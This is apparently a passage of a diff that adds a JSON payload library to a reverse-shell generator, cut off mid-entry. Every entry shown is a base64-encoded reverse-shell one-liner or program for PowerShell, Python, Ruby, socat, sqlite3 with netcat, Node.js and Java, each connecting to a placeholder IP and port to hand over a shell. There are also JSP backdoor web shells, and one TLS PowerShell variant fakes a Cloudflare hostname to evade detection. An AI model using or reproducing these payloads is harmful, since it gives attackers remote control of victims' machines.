+        "command": "cG93ZXJzaGVsbCAtbm9wIC1XIGhpZGRlbiAtbm9uaSAtZXAgYnlwYXNzIC1jICIkVENQQ2xpZW50ID0gTmV3LU9iamVjdCBOZXQuU29ja2V0cy5UQ1BDbGllbnQoJ3tpcH0nLCB7cG9ydH0pOyROZXR3b3JrU3RyZWFtID0gJFRDUENsaWVudC5HZXRTdHJlYW0oKTskU3RyZWFtV3JpdGVyID0gTmV3LU9iamVjdCBJTy5TdHJlYW1Xcml0ZXIoJE5ldHdvcmtTdHJlYW0pO2Z1bmN0aW9uIFdyaXRlVG9TdHJlYW0gKCRTdHJpbmcpIHtbYnl0ZVtdXSRzY3JpcHQ6QnVmZmVyID0gMC4uJFRDUENsaWVudC5SZWNlaXZlQnVmZmVyU2l6ZSB8ICUgezB9OyRTdHJlYW1Xcml0ZXIuV3JpdGUoJFN0cmluZyArICdTSEVMTD4gJyk7JFN0cmVhbVdyaXRlci5GbHVzaCgpfVdyaXRlVG9TdHJlYW0gJyc7d2hpbGUoKCRCeXRlc1JlYWQgPSAkTmV0d29ya1N0cmVhbS5SZWFkKCRCdWZmZXIsIDAsICRCdWZmZXIuTGVuZ3RoKSkgLWd0IDApIHskQ29tbWFuZCA9IChbdGV4dC5lbmNvZGluZ106OlVURjgpLkdldFN0cmluZygkQnVmZmVyLCAwLCAkQnl0ZXNSZWFkIC0gMSk7JE91dHB1dCA9IHRyeSB7SW52b2tlLUV4cHJlc3Npb24gJENvbW1hbmQgMj4mMSB8IE91dC1TdHJpbmd9IGNhdGNoIHskXyB8IE91dC1TdHJpbmd9V3JpdGVUb1N0cmVhbSAoJE91dHB1dCl9JFN0cmVhbVdyaXRlci5DbG9zZSgpIg==",
+        "meta": [
+            "windows"
+        ]
+    },
+    "PowerShell #4 (TLS)": {
+        "command": "JHNzbFByb3RvY29scyA9IFtTeXN0ZW0uU2VjdXJpdHkuQXV0aGVudGljYXRpb24uU3NsUHJvdG9jb2xzXTo6VGxzMTI7ICRUQ1BDbGllbnQgPSBOZXctT2JqZWN0IE5ldC5Tb2NrZXRzLlRDUENsaWVudCgne2lwfScsIHtwb3J0fSk7JE5ldHdvcmtTdHJlYW0gPSAkVENQQ2xpZW50LkdldFN0cmVhbSgpOyRTc2xTdHJlYW0gPSBOZXctT2JqZWN0IE5ldC5TZWN1cml0eS5Tc2xTdHJlYW0oJE5ldHdvcmtTdHJlYW0sJGZhbHNlLCh7JHRydWV9IC1hcyBbTmV0LlNlY3VyaXR5LlJlbW90ZUNlcnRpZmljYXRlVmFsaWRhdGlvbkNhbGxiYWNrXSkpOyRTc2xTdHJlYW0uQXV0aGVudGljYXRlQXNDbGllbnQoJ2Nsb3VkZmxhcmUtZG5zLmNvbScsJG51bGwsJHNzbFByb3RvY29scywkZmFsc2UpO2lmKCEkU3NsU3RyZWFtLklzRW5jcnlwdGVkIC1vciAhJFNzbFN0cmVhbS5Jc1NpZ25lZCkgeyRTc2xTdHJlYW0uQ2xvc2UoKTtleGl0fSRTdHJlYW1Xcml0ZXIgPSBOZXctT2JqZWN0IElPLlN0cmVhbVdyaXRlcigkU3NsU3RyZWFtKTtmdW5jdGlvbiBXcml0ZVRvU3RyZWFtICgkU3RyaW5nKSB7W2J5dGVbXV0kc2NyaXB0OkJ1ZmZlciA9IE5ldy1PYmplY3QgU3lzdGVtLkJ5dGVbXSA0MDk2IDskU3RyZWFtV3JpdGVyLldyaXRlKCRTdHJpbmcgKyAnU0hFTEw+ICcpOyRTdHJlYW1Xcml0ZXIuRmx1c2goKX07V3JpdGVUb1N0cmVhbSAnJzt3aGlsZSgoJEJ5dGVzUmVhZCA9ICRTc2xTdHJlYW0uUmVhZCgkQnVmZmVyLCAwLCAkQnVmZmVyLkxlbmd0aCkpIC1ndCAwKSB7JENvbW1hbmQgPSAoW3RleHQuZW5jb2RpbmddOjpVVEY4KS5HZXRTdHJpbmcoJEJ1ZmZlciwgMCwgJEJ5dGVzUmVhZCAtIDEpOyRPdXRwdXQgPSB0cnkge0ludm9rZS1FeHByZXNzaW9uICRDb21tYW5kIDI+JjEgfCBPdXQtU3RyaW5nfSBjYXRjaCB7JF8gfCBPdXQtU3RyaW5nfVdyaXRlVG9TdHJlYW0gKCRPdXRwdXQpfSRTdHJlYW1Xcml0ZXIuQ2xvc2UoKQ==",
+        "meta": [
+            "windows"
+        ]
+    },
+    "Python #1": {
+        "command": "ZXhwb3J0IFJIT1NUPSJ7aXB9IjtleHBvcnQgUlBPUlQ9e3BvcnR9O3B5dGhvbiAtYyAnaW1wb3J0IHN5cyxzb2NrZXQsb3MscHR5O3M9c29ja2V0LnNvY2tldCgpO3MuY29ubmVjdCgob3MuZ2V0ZW52KCJSSE9TVCIpLGludChvcy5nZXRlbnYoIlJQT1JUIikpKSk7W29zLmR1cDIocy5maWxlbm8oKSxmZCkgZm9yIGZkIGluICgwLDEsMildO3B0eS5zcGF3bigie3NoZWxsfSIpJw==",
+        "meta": [
+            "linux",
+            "mac"
+        ]
+    },
+    "Python #2": {
+        "command": "cHl0aG9uIC1jICdpbXBvcnQgc29ja2V0LHN1YnByb2Nlc3Msb3M7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSk7cy5jb25uZWN0KCgie2lwfSIse3BvcnR9KSk7b3MuZHVwMihzLmZpbGVubygpLDApOyBvcy5kdXAyKHMuZmlsZW5vKCksMSk7b3MuZHVwMihzLmZpbGVubygpLDIpO2ltcG9ydCBwdHk7IHB0eS5zcGF3bigie3NoZWxsfSIpJw==",
+        "meta": [
+            "linux",
+            "mac"
+        ]
+    },
+    "Python3 #1": {
+        "command": "ZXhwb3J0IFJIT1NUPSJ7aXB9IjtleHBvcnQgUlBPUlQ9e3BvcnR9O3B5dGhvbjMgLWMgJ2ltcG9ydCBzeXMsc29ja2V0LG9zLHB0eTtzPXNvY2tldC5zb2NrZXQoKTtzLmNvbm5lY3QoKG9zLmdldGVudigiUkhPU1QiKSxpbnQob3MuZ2V0ZW52KCJSUE9SVCIpKSkpO1tvcy5kdXAyKHMuZmlsZW5vKCksZmQpIGZvciBmZCBpbiAoMCwxLDIpXTtwdHkuc3Bhd24oIntzaGVsbH0iKSc=",
+        "meta": [
+            "linux",
+            "mac"
+        ]
+    },
+    "Python3 #2": {
+        "command": "cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIntpcH0iLHtwb3J0fSkpO29zLmR1cDIocy5maWxlbm8oKSwwKTsgb3MuZHVwMihzLmZpbGVubygpLDEpO29zLmR1cDIocy5maWxlbm8oKSwyKTtpbXBvcnQgcHR5OyBwdHkuc3Bhd24oIntzaGVsbH0iKSc=",
+        "meta": [
+            "linux",
+            "mac"
+        ]
+    },
+    "Python3 Windows": {
+        "command": "aW1wb3J0IG9zLHNvY2tldCxzdWJwcm9jZXNzLHRocmVhZGluZzsKZGVmIHMycChzLCBwKToKICAgIHdoaWxlIFRydWU6CiAgICAgICAgZGF0YSA9IHMucmVjdigxMDI0KQogICAgICAgIGlmIGxlbihkYXRhKSA+IDA6CiAgICAgICAgICAgIHAuc3RkaW4ud3JpdGUoZGF0YSkKICAgICAgICAgICAgcC5zdGRpbi5mbHVzaCgpCgpkZWYgcDJzKHMsIHApOgogICAgd2hpbGUgVHJ1ZToKICAgICAgICBzLnNlbmQocC5zdGRvdXQucmVhZCgxKSkKCnM9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pCnMuY29ubmVjdCgoIntpcH0iLHtwb3J0fSkpCgpwPXN1YnByb2Nlc3MuUG9wZW4oWyJ7c2hlbGx9Il0sIHN0ZG91dD1zdWJwcm9jZXNzLlBJUEUsIHN0ZGVycj1zdWJwcm9jZXNzLlNURE9VVCwgc3RkaW49c3VicHJvY2Vzcy5QSVBFKQoKczJwX3RocmVhZCA9IHRocmVhZGluZy5UaHJlYWQodGFyZ2V0PXMycCwgYXJncz1bcywgcF0pCnMycF90aHJlYWQuZGFlbW9uID0gVHJ1ZQpzMnBfdGhyZWFkLnN0YXJ0KCkKCnAyc190aHJlYWQgPSB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1wMnMsIGFyZ3M9W3MsIHBdKQpwMnNfdGhyZWFkLmRhZW1vbiA9IFRydWUKcDJzX3RocmVhZC5zdGFydCgpCgp0cnk6CiAgICBwLndhaXQoKQpleGNlcHQgS2V5Ym9hcmRJbnRlcnJ1cHQ6CiAgICBzLmNsb3NlKCk=",
+        "meta": [
+            "windows"
+        ]
+    },
+    "Python3 shortest": {
+        "command": "cHl0aG9uMyAtYyAnaW1wb3J0IG9zLHB0eSxzb2NrZXQ7cz1zb2NrZXQuc29ja2V0KCk7cy5jb25uZWN0KCgie2lwfSIse3BvcnR9KSk7W29zLmR1cDIocy5maWxlbm8oKSxmKWZvciBmIGluKDAsMSwyKV07cHR5LnNwYXduKCJ7c2hlbGx9Iikn",
+        "meta": [
+            "linux"
+        ]
+    },
+    "Ruby #1": {
+        "command": "cnVieSAtcnNvY2tldCAtZSdzcGF3bigic2giLFs6aW4sOm91dCw6ZXJyXT0+VENQU29ja2V0Lm5ldygie2lwfSIse3BvcnR9KSkn",
+        "meta": [
+            "linux",
+            "mac"
+        ]
+    },
+    "Ruby no sh": {
+        "command": "cnVieSAtcnNvY2tldCAtZSdleGl0IGlmIGZvcms7Yz1UQ1BTb2NrZXQubmV3KCJ7aXB9Iiwie3BvcnR9Iik7bG9vcHtjLmdldHMuY2hvbXAhOyhleGl0ISBpZiAkXz09ImV4aXQiKTsoJF89fi9jZCAoLispL2k/KERpci5jaGRpcigkMSkpOihJTy5wb3BlbigkXyw/cil7fGlvfGMucHJpbnQgaW8ucmVhZH0pKXJlc2N1ZSBjLnB1dHMgImZhaWxlZDogI3skX30ifSc=",
+        "meta": [
+            "linux",
+            "mac"
+        ]
+    },
+    "socat #1": {
+        "command": "c29jYXQgVENQOntpcH06e3BvcnR9IEVYRUM6e3NoZWxsfQ==",
+        "meta": [
+            "linux",
+            "mac"
+        ]
+    },
+    "socat #2 (TTY)": {
+        "command": "c29jYXQgVENQOntpcH06e3BvcnR9IEVYRUM6J3tzaGVsbH0nLHB0eSxzdGRlcnIsc2V0c2lkLHNpZ2ludCxzYW5l",
+        "meta": [
+            "linux",
+            "mac"
+        ]
+    },
+    "sqlite3 nc mkfifo": {
+        "command": "c3FsaXRlMyAvZGV2L251bGwgJy5zaGVsbCBybSAvdG1wL2Y7bWtmaWZvIC90bXAvZjtjYXQgL3RtcC9mfHtzaGVsbH0gLWkgMj4mMXxuYyB7aXB9IHtwb3J0fSA+L3RtcC9mJw==",
+        "meta": [
+            "linux",
+            "mac"
+        ]
+    },
+    "node.js": {
+        "command": "cmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ25jIC1lIHtzaGVsbH0ge2lwfSB7cG9ydH0nKQ==",
+        "meta": [
+            "linux",
+            "mac"
+        ]
+    },
+    "node.js #2": {
+        "command": "KGZ1bmN0aW9uKCl7DQogICAgdmFyIG5ldCA9IHJlcXVpcmUoIm5ldCIpLA0KICAgICAgICBjcCA9IHJlcXVpcmUoImNoaWxkX3Byb2Nlc3MiKSwNCiAgICAgICAgc2ggPSBjcC5zcGF3bigie3NoZWxsfSIsIFtdKTsNCiAgICB2YXIgY2xpZW50ID0gbmV3IG5ldC5Tb2NrZXQoKTsNCiAgICBjbGllbnQuY29ubmVjdCh7cG9ydH0sICJ7aXB9IiwgZnVuY3Rpb24oKXsNCiAgICAgICAgY2xpZW50LnBpcGUoc2guc3RkaW4pOw0KICAgICAgICBzaC5zdGRvdXQucGlwZShjbGllbnQpOw0KICAgICAgICBzaC5zdGRlcnIucGlwZShjbGllbnQpOw0KICAgIH0pOw0KICAgIHJldHVybiAvYS87IC8vIFByZXZlbnRzIHRoZSBOb2RlLmpzIGFwcGxpY2F0aW9uIGZyb20gY3Jhc2hpbmcNCn0pKCk7",
+        "meta": [
+            "linux",
+            "mac",
+            "windows"
+        ]
+    },
+    "Java #1": {
+        "command": "cHVibGljIGNsYXNzIHNoZWxsIHsKICAgIHB1YmxpYyBzdGF0aWMgdm9pZCBtYWluKFN0cmluZ1tdIGFyZ3MpIHsKICAgICAgICBQcm9jZXNzIHA7CiAgICAgICAgdHJ5IHsKICAgICAgICAgICAgcCA9IFJ1bnRpbWUuZ2V0UnVudGltZSgpLmV4ZWMoImJhc2ggLWMgJEB8YmFzaCAwIGVjaG8gYmFzaCAtaSA+JiAvZGV2L3RjcC97aXB9L3twb3J0fSAwPiYxIik7CiAgICAgICAgICAgIHAud2FpdEZvcigpOwogICAgICAgICAgICBwLmRlc3Ryb3koKTsKICAgICAgICB9IGNhdGNoIChFeGNlcHRpb24gZSkge30KICAgIH0KfQ==",
+        "meta": [
+            "linux",
+            "mac"
+        ]
+    },
+    "Java #2": {
+        "command": "cHVibGljIGNsYXNzIHNoZWxsIHsKICAgIHB1YmxpYyBzdGF0aWMgdm9pZCBtYWluKFN0cmluZ1tdIGFyZ3MpIHsKICAgICAgICBQcm9jZXNzQnVpbGRlciBwYiA9IG5ldyBQcm9jZXNzQnVpbGRlcigiYmFzaCIsICItYyIsICIkQHwgYmFzaCAtaSA+JiAvZGV2L3RjcC97aXB9L3twb3J0fSAwPiYxIikKICAgICAgICAgICAgLnJlZGlyZWN0RXJyb3JTdHJlYW0odHJ1ZSk7CiAgICAgICAgdHJ5IHsKICAgICAgICAgICAgUHJvY2VzcyBwID0gcGIuc3RhcnQoKTsKICAgICAgICAgICAgcC53YWl0Rm9yKCk7CiAgICAgICAgICAgIHAuZGVzdHJveSgpOwogICAgICAgIH0gY2F0Y2ggKEV4Y2VwdGlvbiBlKSB7fQogICAgfQp9",
+        "meta": [
+            "linux",
+            "mac"
+        ]
+    },
+    "Java #3": {
+        "command": "aW1wb3J0IGphdmEuaW8uSW5wdXRTdHJlYW07CmltcG9ydCBqYXZhLmlvLk91dHB1dFN0cmVhbTsKaW1wb3J0IGphdmEubmV0LlNvY2tldDsKCnB1YmxpYyBjbGFzcyBzaGVsbCB7CiAgICBwdWJsaWMgc3RhdGljIHZvaWQgbWFpbihTdHJpbmdbXSBhcmdzKSB7CiAgICAgICAgU3RyaW5nIGhvc3QgPSAie2lwfSI7CiAgICAgICAgaW50IHBvcnQgPSB7cG9ydH07CiAgICAgICAgU3RyaW5nIGNtZCA9ICJ7c2hlbGx9IjsKICAgICAgICB0cnkgewogICAgICAgICAgICBQcm9jZXNzIHAgPSBuZXcgUHJvY2Vzc0J1aWxkZXIoY21kKS5yZWRpcmVjdEVycm9yU3RyZWFtKHRydWUpLnN0YXJ0KCk7CiAgICAgICAgICAgIFNvY2tldCBzID0gbmV3IFNvY2tldChob3N0LCBwb3J0KTsKICAgICAgICAgICAgSW5wdXRTdHJlYW0gcGkgPSBwLmdldElucHV0U3RyZWFtKCksIHBlID0gcC5nZXRFcnJvclN0cmVhbSgpLCBzaSA9IHMuZ2V0SW5wdXRTdHJlYW0oKTsKICAgICAgICAgICAgT3V0cHV0U3RyZWFtIHBvID0gcC5nZXRPdXRwdXRTdHJlYW0oKSwgc28gPSBzLmdldE91dHB1dFN0cmVhbSgpOwogICAgICAgICAgICB3aGlsZSAoIXMuaXNDbG9zZWQoKSkgewogICAgICAgICAgICAgICAgd2hpbGUgKHBpLmF2YWlsYWJsZSgpID4gMCkKICAgICAgICAgICAgICAgICAgICBzby53cml0ZShwaS5yZWFkKCkpOwogICAgICAgICAgICAgICAgd2hpbGUgKHBlLmF2YWlsYWJsZSgpID4gMCkKICAgICAgICAgICAgICAgICAgICBzby53cml0ZShwZS5yZWFkKCkpOwogICAgICAgICAgICAgICAgd2hpbGUgKHNpLmF2YWlsYWJsZSgpID4gMCkKICAgICAgICAgICAgICAgICAgICBwby53cml0ZShzaS5yZWFkKCkpOwogICAgICAgICAgICAgICAgc28uZmx1c2goKTsKICAgICAgICAgICAgICAgIHBvLmZsdXNoKCk7CiAgICAgICAgICAgICAgICBUaHJlYWQuc2xlZXAoNTApOwogICAgICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgICAgICBwLmV4aXRWYWx1ZSgpOwogICAgICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICAgICAgfSBjYXRjaCAoRXhjZXB0aW9uIGUpIHt9CiAgICAgICAgICAgIH0KICAgICAgICAgICAgcC5kZXN0cm95KCk7CiAgICAgICAgICAgIHMuY2xvc2UoKTsKICAgICAgICB9IGNhdGNoIChFeGNlcHRpb24gZSkge30KICAgIH0KfQ==",
+        "meta": [
+            "windows",
+            "linux",
+            "mac"
+        ]
+    },
+    "Java Web": {
+        "command": "PCVADQpwYWdlIGltcG9ydD0iamF2YS5sYW5nLiosIGphdmEudXRpbC4qLCBqYXZhLmlvLiosIGphdmEubmV0LioiDQolID4NCjwlIQ0Kc3RhdGljIGNsYXNzIFN0cmVhbUNvbm5lY3RvciBleHRlbmRzIFRocmVhZA0Kew0KICAgICAgICBJbnB1dFN0cmVhbSBpczsNCiAgICAgICAgT3V0cHV0U3RyZWFtIG9zOw0KICAgICAgICBTdHJlYW1Db25uZWN0b3IoSW5wdXRTdHJlYW0gaXMsIE91dHB1dFN0cmVhbSBvcykNCiAgICAgICAgew0KICAgICAgICAgICAgICAgIHRoaXMuaXMgPSBpczsNCiAgICAgICAgICAgICAgICB0aGlzLm9zID0gb3M7DQogICAgICAgIH0NCiAgICAgICAgcHVibGljIHZvaWQgcnVuKCkNCiAgICAgICAgew0KICAgICAgICAgICAgICAgIEJ1ZmZlcmVkUmVhZGVyIGlzciA9IG51bGw7DQogICAgICAgICAgICAgICAgQnVmZmVyZWRXcml0ZXIgb3N3ID0gbnVsbDsNCiAgICAgICAgICAgICAgICB0cnkNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICBpc3IgPSBuZXcgQnVmZmVyZWRSZWFkZXIobmV3IElucHV0U3RyZWFtUmVhZGVyKGlzKSk7DQogICAgICAgICAgICAgICAgICAgICAgICBvc3cgPSBuZXcgQnVmZmVyZWRXcml0ZXIobmV3IE91dHB1dFN0cmVhbVdyaXRlcihvcykpOw0KICAgICAgICAgICAgICAgICAgICAgICAgY2hhciBidWZmZXJbXSA9IG5ldyBjaGFyWzgxOTJdOw0KICAgICAgICAgICAgICAgICAgICAgICAgaW50IGxlblJlYWQ7DQogICAgICAgICAgICAgICAgICAgICAgICB3aGlsZSggKGxlblJlYWQgPSBpc3IucmVhZChidWZmZXIsIDAsIGJ1ZmZlci5sZW5ndGgpKSA+IDApDQogICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIG9zdy53cml0ZShidWZmZXIsIDAsIGxlblJlYWQpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBvc3cuZmx1c2goKTsNCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgY2F0Y2ggKEV4Y2VwdGlvbiBpb2UpDQogICAgICAgICAgICAgICAgdHJ5DQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgaWYoaXNyICE9IG51bGwpIGlzci5jbG9zZSgpOw0KICAgICAgICAgICAgICAgICAgICAgICAgaWYob3N3ICE9IG51bGwpIG9zdy5jbG9zZSgpOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICBjYXRjaCAoRXhjZXB0aW9uIGlvZSkNCiAgICAgICAgfQ0KfQ0KJT4NCg0KPGgxPkpTUCBCYWNrZG9vciBSZXZlcnNlIFNoZWxsPC9oMT4NCg0KPGZvcm0gbWV0aG9kPSJwb3N0Ij4NCklQIEFkZHJlc3MNCjxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJpcGFkZHJlc3MiIHNpemU9MzA+DQpQb3J0DQo8aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0icG9ydCIgc2l6ZT0xMD4NCjxpbnB1dCB0eXBlPSJzdWJtaXQiIG5hbWU9IkNvbm5lY3QiIHZhbHVlPSJDb25uZWN0Ij4NCjwvZm9ybT4NCjxwPg0KPGhyPg0KDQo8JQ0KU3RyaW5nIGlwQWRkcmVzcyA9IHJlcXVlc3QuZ2V0UGFyYW1ldGVyKCJpcGFkZHJlc3MiKTsNClN0cmluZyBpcFBvcnQgPSByZXF1ZXN0LmdldFBhcmFtZXRlcigicG9ydCIpOw0KaWYoaXBBZGRyZXNzICE9IG51bGwgJiYgaXBQb3J0ICE9IG51bGwpDQp7DQogICAgICAgIFNvY2tldCBzb2NrID0gbnVsbDsNCiAgICAgICAgdHJ5DQogICAgICAgIHsNCiAgICAgICAgICAgICAgICBzb2NrID0gbmV3IFNvY2tldChpcEFkZHJlc3MsIChuZXcgSW50ZWdlcihpcFBvcnQpKS5pbnRWYWx1ZSgpKTsNCiAgICAgICAgICAgICAgICBSdW50aW1lIHJ0ID0gUnVudGltZS5nZXRSdW50aW1lKCk7DQogICAgICAgICAgICAgICAgUHJvY2VzcyBwcm9jID0gcnQuZXhlYygiY21kLmV4ZSIpOw0KICAgICAgICAgICAgICAgIFN0cmVhbUNvbm5lY3RvciBvdXRwdXRDb25uZWN0b3IgPQ0KICAgICAgICAgICAgICAgICAgICAgICAgbmV3IFN0cmVhbUNvbm5lY3Rvcihwcm9jLmdldElucHV0U3RyZWFtKCksDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzb2NrLmdldE91dHB1dFN0cmVhbSgpKTsNCiAgICAgICAgICAgICAgICBTdHJlYW1Db25uZWN0b3IgaW5wdXRDb25uZWN0b3IgPQ0KICAgICAgICAgICAgICAgICAgICAgICAgbmV3IFN0cmVhbUNvbm5lY3Rvcihzb2NrLmdldElucHV0U3RyZWFtKCksDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcm9jLmdldE91dHB1dFN0cmVhbSgpKTsNCiAgICAgICAgICAgICAgICBvdXRwdXRDb25uZWN0b3Iuc3RhcnQoKTsNCiAgICAgICAgICAgICAgICBpbnB1dENvbm5lY3Rvci5zdGFydCgpOw0KICAgICAgICB9DQogICAgICAgIGNhdGNoKEV4Y2VwdGlvbiBlKSANCn0NCiU+",
+        "meta": [
+            "windows",
+            "linux",
+            "mac"
+        ]
+    },
+    "Java Two Way": {
+        "command": "PCUNCiAgICAvKg0KICAgICAqIFVzYWdlOiBUaGlzIGlzIGEgMiB3YXkgc2hlbGwsIG9uZSB3ZWIgc2hlbGwgYW5kIGEgcmV2ZXJzZSBzaGVsbC4gRmlyc3QsIGl0IHdpbGwgdHJ5IHRvIGNvbm5lY3QgdG8gYSBsaXN0ZW5lciAoYXRhY2tlciBtYWNoaW5lKSwgd2l0aCB0aGUgSVAgYW5kIFBvcnQgc3BlY2lmaWVkIGF0IHRoZSBlbmQgb2YgdGhlIGZpbGUuDQogICAgICogSWYgaXQgY2Fubm90IGNvbm5lY3QsIGFuIEhUTUwgd2lsbCBwcm9tcHQgYW5kIHlvdSBjYW4gaW5wdXQgY29tbWFuZHMgKHNoL2NtZCkgdGhlcmUgYW5kIGl0IHdpbGwgcHJvbXB0cyB0aGUgb3V0cHV0IGluIHRoZSBIVE1MLg0KICAgICAqIE5vdGUgdGhhdCB0aGlzIGxhc3QgZnVuY3Rpb25hbGl0eSBpcyBzbG93LCBzbyB0aGUgZmlyc3Qgb25lIChyZXZlcnNlIHNoZWxsKSBpcyByZWNvbW1lbmRlZC4gRWFjaCB0aW1lIHRoZSBidXR0b24gInNlbmQiIGlzIGNsaWNrZWQsIGl0IHdpbGwgdHJ5IHRvIGNvbm5lY3QgdG8gdGhlIHJldmVyc2Ugc2hlbGwgYWdhaW4gKGFwYXJ0IGZyb20gZXhlY3V0aW5nIA0KICAgICAqIHRoZSBjb21tYW5kIHNwZWNpZmllZCBpbiB0aGUgSFRNTCBmb3JtKS4gVGhpcyBpcyB0byBhdm9pZCB0byBrZWVwIGl0IHNpbXBsZS4NCiAgICAgKi8NCiU+DQoNCjwlQHBhZ2UgaW1wb3J0PSJqYXZhLmxhbmcuKiIlPg0KPCVAcGFnZSBpbXBvcnQ9ImphdmEuaW8uKiIlPg0KPCVAcGFnZSBpbXBvcnQ9ImphdmEubmV0LioiJT4NCjwlQHBhZ2UgaW1wb3J0PSJqYXZhLnV0aWwuKiIlPg0KDQo8aHRtbD4NCjxoZWFkPg0KICAgIDx0aXRsZT5qcnNoZWxsPC90aXRsZT4NCjwvaGVhZD4NCjxib2R5Pg0KPGZvcm0gTUVUSE9EPSJQT1NUIiBOQU1FPSJteWZvcm0iIEFDVElPTj0iIj4NCiAgICA8aW5wdXQgVFlQRT0idGV4dCIgTkFNRT0ic2hlbGwiPg0KICAgIDxpbnB1dCBUWVBFPSJzdWJtaXQiIFZBTFVFPSJTZW5kIj4NCjwvZm9ybT4NCjxwcmU+DQo8JQ0KICAgIC8vIERlZmluZSB0aGUgT1MNCiAgICBTdHJpbmcgc2hlbGxQYXRoID0gbnVsbDsNCiAgICB0cnkNCiAgICB7DQogICAgICAgIGlmIChTeXN0ZW0uZ2V0UHJvcGVydHkoIm9zLm5hbWUiKS50b0xvd2VyQ2FzZSgpLmluZGV4T2YoIndpbmRvd3MiKSA9PSAtMSkgew0KICAgICAgICAgICAgc2hlbGxQYXRoID0gbmV3IFN0cmluZygiL2Jpbi9zaCIpOw0KICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgc2hlbGxQYXRoID0gbmV3IFN0cmluZygiY21kLmV4ZSIpOw0KICAgICAgICB9DQogICAgfSBjYXRjaCggRXhjZXB0aW9uIGUgKXt9DQogICAgLy8gSU5ORVIgSFRNTCBQQVJUDQogICAgaWYgKHJlcXVlc3QuZ2V0UGFyYW1ldGVyKCJzaGVsbCIpICE9IG51bGwpIHsNCiAgICAgICAgb3V0LnByaW50bG4oIkNvbW1hbmQ6ICIgKyByZXF1ZXN0LmdldFBhcmFtZXRlcigic2hlbGwiKSArICJcbjxCUj4iKTsNCiAgICAgICAgUHJvY2VzcyBwOw0KICAgICAgICBpZiAoc2hlbGxQYXRoLmVxdWFscygiY21kLmV4ZSIpKQ0KICAgICAgICAgICAgcCA9IFJ1bnRpbWUuZ2V0UnVudGltZSgpLmV4ZWMoImNtZC5leGUgL2MgIiArIHJlcXVlc3QuZ2V0UGFyYW1ldGVyKCJzaGVsbCIpKTsNCiAgICAgICAgZWxzZQ0KICAgICAgICAgICAgcCA9IFJ1bnRpbWUuZ2V0UnVudGltZSgpLmV4ZWMoIi9iaW4vc2ggLWMgIiArIHJlcXVlc3QuZ2V0UGFyYW1ldGVyKCJzaGVsbCIpKTsNCiAgICAgICAgT3V0cHV0U3RyZWFtIG9zID0gcC5nZXRPdXRwdXRTdHJlYW0oKTsNCiAgICAgICAgSW5wdXRTdHJlYW0gaW4gPSBwLmdldElucHV0U3RyZWFtKCk7DQogICAgICAgIERhdGFJbnB1dFN0cmVhbSBkaXMgPSBuZXcgRGF0YUlucHV0U3RyZWFtKGluKTsNCiAgICAgICAgU3RyaW5nIGRpc3IgPSBkaXMucmVhZExpbmUoKTsNCiAgICAgICAgd2hpbGUgKCBkaXNyICE9IG51bGwgKSB7DQogICAgICAgICAgICBvdXQucHJpbnRsbihkaXNyKTsNCiAgICAgICAgICAgIGRpc3IgPSBkaXMucmVhZExpbmUoKTsNCiAgICAgICAgfQ0KICAgIH0NCiAgICAvLyBUQ1AgUE9SVCBQQVJUDQogICAgY2xhc3MgU3RyZWFtQ29ubmVjdG9yIGV4dGVuZHMgVGhyZWFkDQogICAgew0KICAgICAgICBJbnB1dFN0cmVhbSB3ejsNCiAgICAgICAgT3V0cHV0U3RyZWFtIHlyOw0KICAgICAgICBTdHJlYW1Db25uZWN0b3IoIElucHV0U3RyZWFtIHd6LCBPdXRwdXRTdHJlYW0geXIgKSB7DQogICAgICAgICAgICB0aGlzLnd6ID0gd3o7DQogICAgICAgICAgICB0aGlzLnlyID0geXI7DQogICAgICAgIH0NCiAgICAgICAgcHVibGljIHZvaWQgcnVuKCkNCiAgICAgICAgew0KICAgICAgICAgICAgQnVmZmVyZWRSZWFkZXIgciAgPSBudWxsOw0KICAgICAgICAgICAgQnVmZmVyZWRXcml0ZXIgdyA9IG51bGw7DQogICAgICAgICAgICB0cnkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICByICA9IG5ldyBCdWZmZXJlZFJlYWRlcihuZXcgSW5wdXRTdHJlYW1SZWFkZXIod3opKTsNCiAgICAgICAgICAgICAgICB3ID0gbmV3IEJ1ZmZlcmVkV3JpdGVyKG5ldyBPdXRwdXRTdHJlYW1Xcml0ZXIoeXIpKTsNCiAgICAgICAgICAgICAgICBjaGFyIGJ1ZmZlcltdID0gbmV3IGNoYXJbODE5Ml07DQogICAgICAgICAgICAgICAgaW50IGxlbmd0aDsNCiAgICAgICAgICAgICAgICB3aGlsZSggKCBsZW5ndGggPSByLnJlYWQoIGJ1ZmZlciwgMCwgYnVmZmVyLmxlbmd0aCApICkgPiAwICkNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIHcud3JpdGUoIGJ1ZmZlciwgMCwgbGVuZ3RoICk7DQogICAgICAgICAgICAgICAgICAgIHcuZmx1c2goKTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9IGNhdGNoKCBFeGNlcHRpb24gZSApe30NCiA